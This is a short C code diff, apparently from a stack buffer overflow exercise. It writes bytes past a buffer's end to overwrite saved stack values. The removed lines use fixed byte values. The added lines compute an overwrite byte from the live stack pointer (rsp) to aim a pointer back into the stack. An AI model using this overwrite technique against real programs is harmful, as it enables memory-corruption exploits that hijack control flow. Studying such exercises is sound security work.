@@ -88,15 +88,9 @@ cont:
 		//while ((buff[n++] = getchar()) != '\n')
 		//	;
 		int BUF_SIZE = 49;
-		for (int i =8+BUF_SIZE ; i<10+BUF_SIZE; i++){
-			buff[i] = (char)0x00;
-		}
-		
-		buff[10+BUF_SIZE] = (char) 0x7f;
-		for (int i =11+BUF_SIZE ; i<14+BUF_SIZE; i++){
-			buff[i] = (char)0xff;
-		}
-		buff[7+BUF_SIZE+16]= (char) 0x81;
+		register long rsp asm ("rsp");
+
+		buff[7+BUF_SIZE+16]= (char) ((rsp & 0xff) + 17);
 		buff[8+BUF_SIZE+16]= (char) 0xde;
 		buff[9+BUF_SIZE+16]= (char) 0xff;
 		buff[10+BUF_SIZE+16]= (char) 0xff;
